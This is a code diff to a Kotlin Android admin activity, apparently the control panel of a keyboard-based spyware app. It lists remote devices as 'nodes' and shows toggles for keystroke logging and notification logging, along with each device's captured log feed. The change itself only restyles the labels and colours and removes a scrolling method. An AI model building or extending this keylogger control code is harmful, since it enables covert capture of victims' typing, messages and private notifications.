@@ -2,7 +2,6 @@ package com.example.mykeyboardadmin
 
 import android.graphics.Color
 import android.os.Bundle
-import android.text.method.ScrollingMovementMethod
 import android.view.LayoutInflater
 import android.view.MotionEvent
 import android.view.View
@@ -241,22 +240,22 @@ class AdminMainActivity : AppCompatActivity() {
 
         override fun onBindViewHolder(holder: ViewHolder, position: Int) {
             val device = devices[position]
-            holder.txtName.text = "📱 Device: ${device.name}"
+            holder.txtName.text = "NODE // ${device.name}"
 
             if (device.keylogging) {
-                holder.btnKey.text = "Key Logger: ON"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#388E3C"))
+                holder.btnKey.text = "KEY_LOG: ON"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#238636"))
             } else {
-                holder.btnKey.text = "Key Logger: OFF"
-                holder.btnKey.setBackgroundColor(Color.parseColor("#C62828"))
+                holder.btnKey.text = "KEY_LOG: OFF"
+                holder.btnKey.setBackgroundColor(Color.parseColor("#DA3633"))
             }
 
             if (device.notifications) {
-                holder.btnNotif.text = "Notif Logger: ON"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#388E3C"))
+                holder.btnNotif.text = "NOTIF_LOG: ON"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#238636"))
             } else {
-                holder.btnNotif.text = "Notif Logger: OFF"
-                holder.btnNotif.setBackgroundColor(Color.parseColor("#C62828"))
+                holder.btnNotif.text = "NOTIF_LOG: OFF"
+                holder.btnNotif.setBackgroundColor(Color.parseColor("#DA3633"))
             }
 
             holder.scrollView.setOnTouchListener { v, event ->
@@ -270,7 +269,6 @@ class AdminMainActivity : AppCompatActivity() {
                 }
                 false
             }
-            holder.txtLog.movementMethod = ScrollingMovementMethod()
             holder.txtLog.text = device.logFeed
 
             holder.btnKey.setOnClickListener {
